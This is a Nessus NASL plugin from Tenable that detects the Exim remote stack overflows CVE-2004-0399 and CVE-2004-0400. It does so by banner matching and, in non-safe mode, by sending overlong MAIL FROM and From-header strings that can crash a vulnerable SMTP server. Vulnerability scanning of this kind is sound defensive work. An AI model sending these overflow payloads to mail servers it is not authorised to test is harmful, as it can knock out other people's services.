#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(12232);
 script_version("$Revision: 1.21 $");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");

 script_cve_id("CVE-2004-0399", "CVE-2004-0400");
 script_osvdb_id(5896, 5897);
 script_xref(name:"Secunia", value:"11558");

 script_name(english:"Exim < 3.36 / 4.33 Multiple Remote Overflows");
 script_summary(english:"Exim Multiple Overflows");

 script_set_attribute(attribute:"synopsis", value:"The remote SMTP server has multiple buffer overflow vulnerabilities.");
 script_set_attribute(attribute:"description", value:
"The remote version of Exim has multiple remote stack-based buffer
overflow vulnerabilities when header syntax checking is enabled. It
should be noted that this is not the default configuration. A remote
attacker could exploit this to execute arbitrary code.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2004/May/270");
 script_set_attribute(attribute:"solution", value:
"Upgrade to Exim 4.32 or later, or disable header syntax checking in
exim.conf.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");

 script_set_attribute(attribute:"vuln_publication_date", value:"2004/05/06");
 script_set_attribute(attribute:"plugin_publication_date", value:"2004/05/06");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:exim:exim");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_family(english:"SMTP problems");

 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");

 script_dependencie("smtpserver_detect.nasl");	# should we use the result from smtpscan?
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/smtp");
if(!port) port = 25;
if (! get_port_state(port)) exit(0);

banner = get_smtp_banner(port:port);
if(!banner)exit(0);
if (! egrep(string:banner, pattern:"Exim") ) exit(0);


if (safe_checks()) {
    if(egrep(pattern:"220.*Exim ([0-2]\.|3\.([0-2][0-9]|3[0-5])|4\.([0-2][0-9]|3[0-2]))", string:banner))
    {
      report = string("\nNessus verified this solely by checking the banner.\n");
      security_warning(port);
    }

    exit(0);
} else {
    soc = open_sock_tcp(port);
    if (!soc) exit(0);
    banner = smtp_recv_line(socket:soc);
    if ( ! banner ) exit(0);

    req = string("HELO x.x.x.x\r\n");
    req += string("MAIL FROM: ", crap(300), "@nessus.org\r\n\r\n");
    req += string("RCPT TO: web@localhost\r\n");
    req += string("DATA\r\n");
    req += string("blahblah\r\n.\r\nQUIT\r\n");
    send(socket:soc, data:req);
    r = recv_line(socket:soc, length:512);
    if (!r) { security_warning(port); exit(0); }
    close(soc);

    # non-safe check # 2
    req = string("HELO x.x.x.x\r\n");
    req += string("MAIL FROM: nessus@nessus.org\r\n");
    req += string("RCPT TO: web@localhost\r\n");
    req += string("DATA\r\n");
    req += string("From", crap(data:" ", length:275), ":nessus\r\n");
    req += string("blahblah\r\n.\r\nQUIT\r\n");
    soc = open_sock_tcp(port);
    if (!soc) { security_warning(port); exit(0); }
    banner = smtp_recv_line(socket:soc);
    if ( ! banner ) exit(0);
    send(socket:soc, data:req);
    r = recv_line(socket:soc, length:512);
    if (!r) { security_warning(port); exit(0); }
    close (soc);

    # non-safe check # 3
    req = string("HELO x.x.x.x\r\n");
    req += string("MAIL FROM: nessus@nessus.org\r\n");
    req += string("RCPT TO: web@localhost\r\n");
    req += string("DATA\r\n");
    req += string("From", crap(data:" ", length:275), ":nessus\r\n");
    req += string("blahblah\r\n.\r\nQUIT\r\n");
    soc = open_sock_tcp(port);
    if (!soc) { security_warning(port); exit(0); }
    banner = smtp_recv_line(socket:soc);
    if ( ! banner ) exit(0);
    send(socket:soc, data:req);
    r = recv_line(socket:soc, length:512);
    if (!r) { security_warning(port); exit(0); }
    close (soc);
    exit(0);
}

